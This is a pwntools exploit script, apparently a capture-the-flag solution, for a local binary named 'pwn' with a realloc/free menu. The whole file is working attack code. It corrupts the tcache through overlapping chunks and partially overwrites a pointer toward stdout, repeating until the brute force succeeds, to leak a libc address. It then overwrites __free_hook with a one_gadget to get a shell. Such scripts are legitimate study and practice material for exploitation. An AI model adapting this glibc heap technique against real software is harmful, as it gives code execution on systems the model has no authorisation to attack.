#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop = True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x,y: p.sendafter(x, y)

# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','120']

filename = "./pwn"

e = ELF(filename)
l = e.libc
# input()


def freeN():
	ru(b">>")
	sl(b"2")
def reallocN(size, content):
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(size).encode())
	ru(b"t?\n")
	s(content)
def clearN():
	ru(b">>")
	sl(b"666")

while True:
	try:
		p = process(filename)

		# fill_up_tcache
		reallocN(0x40, b"aaa")
		reallocN(0x00, b"")
		reallocN(0x100, b"aaa")
		reallocN(0xc0, b"aaa")
		for _ in range(7):
			freeN()

		# set_$realloc_ptr_to_0x00
		reallocN(0x00, b"")
		# chunk_overlap
		reallocN(0x40, b"b"*0x40)
		reallocN(0x100,b'c'*0x40 + p64(0) + p64(0x41) + p16((0x6 << 0xC) + (l.symbols['_IO_2_1_stdout_'] & 0xFFF)))
		reallocN(0x00, b"")
		reallocN(0xc0, b"aaa")
		reallocN(0x00, b"")
		reallocN(0xc0,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58))
		leak = u64(r(6).ljust(8, b"\x00"))
		if leak >> 40 != 0x7f:
			raise Exception("error")
		print("[+] leak_addr: " + hex(leak))
		libc_addr = leak - 0x3e82a0
		one_gadget= libc_addr + 0x4f3c2
		print("[+] libc_addr: " + hex(libc_addr))
		print(p.pid)
		input()
		clearN()
		reallocN(0x110, b"a"*0x40 + p64(0) + p64(0x51) + p64(l.symbols['__free_hook'] + libc_addr))
		reallocN(0x00, b"")
		reallocN(0x30, b"aa")
		reallocN(0x00, b"")
		reallocN(0x30, p64(one_gadget))
		freeN()

		p.interactive()
	except Exception as e:
		p.close()
		continue